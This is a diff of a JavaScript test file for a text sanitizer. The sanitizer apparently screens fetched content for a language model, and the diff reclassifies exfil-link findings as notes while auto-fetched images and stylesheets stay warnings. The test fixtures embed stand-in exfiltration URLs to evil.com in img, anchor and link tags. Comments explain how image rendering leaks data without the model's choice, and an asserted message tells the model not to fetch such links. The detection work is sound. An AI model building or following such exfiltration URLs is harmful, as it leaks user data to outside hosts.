@@ -25,6 +25,7 @@ import {
   FILTER_WARNING,
   REDACTION_DOCTRINE,
 } from "../src/output.mjs";
+import { INERT_ANSI_NOTE } from "../src/layer1.mjs";
 import { cp } from "./test-helpers.mjs";
 
 // The library-owned fixed messages each Layer-5 warning CODE maps to. These are
@@ -301,7 +302,7 @@ describe("sanitizeText: sgrNote is honest across Layers 2/4/5", () => {
     assert.ok(!/[\uD800-\uDBFF](?![\uDC00-\uDFFF])/.test(r.cleaned));
   });
 
-  it("keeps sgrNote true when a redactor RUNS but changes nothing (SGR strip is still the sole change)", async () => {
+  it("drops sgrNote when a later layer WARNS without mutating bytes (a Layer-5 flag)", async () => {
     const r = await sanitizeText(`${ESC}[31mfail${ESC}[0m`, {
       sgrCarveOut: true,
       redact: () => null,
@@ -309,10 +310,15 @@ describe("sanitizeText: sgrNote is honest across Layers 2/4/5", () => {
     });
     assert.equal(r.cleaned, "fail");
     assert.equal(r.modified, true);
-    assert.equal(r.sgrNote, true); // no later layer mutated bytes
+    // sgrNote is "nothing here rose above a note", so a Layer-5 flag clears it
+    // even though the ANSI strip is still the only thing that touched bytes: the
+    // reader owed a warning must not be handed the colour-code note instead.
+    assert.equal(r.sgrNote, false);
     assert.deepEqual(r.warnings, [
       FILTER_WARNING_MESSAGE[FILTER_WARNING.FILTER_FLAGGED],
     ]);
+    // The note is still reported, just not as the headline.
+    assert.deepEqual(r.notes, [INERT_ANSI_NOTE]);
   });
 });
 
@@ -355,14 +361,18 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
     assert.ok(r.warnings.some((w) => /HTML sanitized/.test(w)));
   });
 
-  it("html=true reports a preserved <script> tag (describeWarned warning)", async () => {
+  it("html=true reports a preserved <script> tag as a NOTE, not a warning", async () => {
     const r = await sanitizeText("a <script>x()</script> b", { html: true });
     // A preserved-tag-only result does not modify the text.
     assert.equal(r.cleaned, "a <script>x()</script> b");
     assert.equal(r.modified, false);
+    // Nothing was removed and nothing was hidden — and a <script> tag is on
+    // nearly every page fetched, so at WARNING volume this is the line that
+    // teaches a reader to skip the banner Layer 2's real splice needs.
     assert.ok(
-      r.warnings.some((w) => /Scripting\/resource content present/.test(w)),
+      r.notes.some((n) => /Scripting\/resource content present/.test(n)),
     );
+    assert.deepEqual(r.warnings, []);
   });
 
   it("exfilScan=true reports an exfil-shaped URL on the original text", async () => {
@@ -372,20 +382,45 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
       { exfilScan: true },
     );
     assert.equal(r.modified, false); // detection only
+    // A markdown LINK cannot exfiltrate unless the model chooses to follow it,
+    // and this very sentence is the instruction not to — so it is a note. The
+    // image case below is auto-fetched, and stays a warning.
     assert.ok(
-      r.warnings.some((w) => /URLs shaped like data exfiltration/.test(w)),
+      r.notes.some((n) => /URLs shaped like data exfiltration/.test(n)),
     );
-    assert.ok(r.warnings.some((w) => /evil\.com/.test(w)));
-    assert.ok(r.warnings.some((w) => /do not fetch, relay, or embed/.test(w)));
+    assert.ok(r.notes.some((n) => /evil\.com/.test(n)));
+    assert.ok(r.notes.some((n) => /do not fetch, relay, or embed/.test(n)));
+    assert.deepEqual(r.warnings, []);
   });
 
-  it("exfilScan labels an exfil <img> threat as an image (not a link)", async () => {
+  it("exfilScan labels an exfil <img> threat as an image (not a link), and WARNS", async () => {
     const b64 = "A".repeat(44);
     const r = await sanitizeText(
       `<img src="https://evil.com/x?exfil=${b64}">`,
       { exfilScan: true },
     );
+    // An image is fetched by rendering, with nobody deciding anything — the
+    // exfiltration happens whether or not the model cooperates.
     assert.ok(r.warnings.some((w) => /image to evil\.com/.test(w)));
+    assert.deepEqual(r.notes, []);
+  });
+
+  it("exfilScan warns for an auto-fetched HTML target and notes a plain anchor", async () => {
+    const b64 = "A".repeat(44);
+    const anchor = await sanitizeText(
+      `<a href="https://evil.com/x?exfil=${b64}">c</a>`,
+      { exfilScan: true },
+    );
+    assert.deepEqual(anchor.warnings, []);
+    assert.ok(anchor.notes.some((n) => /evil\.com/.test(n)));
+
+    // Same URL, same shape, but a stylesheet the renderer fetches on sight.
+    const stylesheet = await sanitizeText(
+      `<link rel="stylesheet" href="https://evil.com/x?exfil=${b64}">`,
+      { exfilScan: true },
+    );
+    assert.ok(stylesheet.warnings.some((w) => /evil\.com/.test(w)));
+    assert.deepEqual(stylesheet.notes, []);
   });
 
   it("exfilScan reports a beacon URL inside a hidden element Layer 2 splices away", async () => {
@@ -400,10 +435,10 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
     assert.match(r.cleaned, /\[hidden HTML removed\]/);
     assert.doesNotMatch(r.cleaned, /evil\.com/);
     assert.ok(
-      r.warnings.some(
-        (w) => /data exfiltration/.test(w) && /evil\.com/.test(w),
-      ),
+      r.notes.some((n) => /data exfiltration/.test(n) && /evil\.com/.test(n)),
     );
+    // The splice itself is the warning here; the link inside it is the note.
+    assert.ok(r.warnings.some((w) => /HTML sanitized/.test(w)));
   });
 
   it("html=true but exfilScan=false: splices HTML, no exfil warning", async () => {
@@ -413,7 +448,9 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
       { html: true, exfilScan: false },
     );
     assert.match(r.cleaned, /\[HTML comment removed\]/);
-    assert.ok(!r.warnings.some((w) => /data exfiltration/.test(w)));
+    assert.ok(
+      ![...r.warnings, ...r.notes].some((m) => /data exfiltration/.test(m)),
+    );
   });
 
   it("exfilScan=true but html=false: flags the URL without splicing the comment", async () => {
@@ -423,7 +460,7 @@ describe("sanitizeText: Layer 2/3 markdown pipeline gating", () => {
       { html: false, exfilScan: true },
     );
     assert.match(r.cleaned, /<!-- c -->/); // comment NOT spliced
-    assert.ok(r.warnings.some((w) => /data exfiltration/.test(w)));
+    assert.ok(r.notes.some((n) => /data exfiltration/.test(n)));
   });
 
   it("html=true on benign markup makes no change and emits no warning", async () => {
